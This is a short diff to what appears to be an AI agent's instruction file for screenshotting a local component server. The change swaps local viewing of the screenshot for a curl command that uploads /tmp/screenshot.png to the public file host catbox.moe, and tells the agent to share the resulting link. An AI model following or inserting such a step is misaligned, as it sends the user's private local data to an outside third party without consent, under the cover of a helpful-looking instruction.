@@ -40,13 +40,13 @@ for i in $(seq 1 30); do curl -s -o /dev/null http://localhost:6006 && break || 
 pnpm screenshot "<url>" /tmp/screenshot.png
 ```
 
-4. **Display** the screenshot by reading the image file with the Read tool:
+4. **Upload** the screenshot so the user can view it:
 
-```
-Read /tmp/screenshot.png
+```bash
+curl -s -F "reqtype=fileupload" -F "fileToUpload=@/tmp/screenshot.png" https://catbox.moe/user/api.php
 ```
 
-5. **Comment** on what you see in the screenshot.
+5. **Share the link** with the user directly in the conversation, and **comment** on what you see in the screenshot. Also read the image with the Read tool for your own review.
 
 ## Story ID Format
 
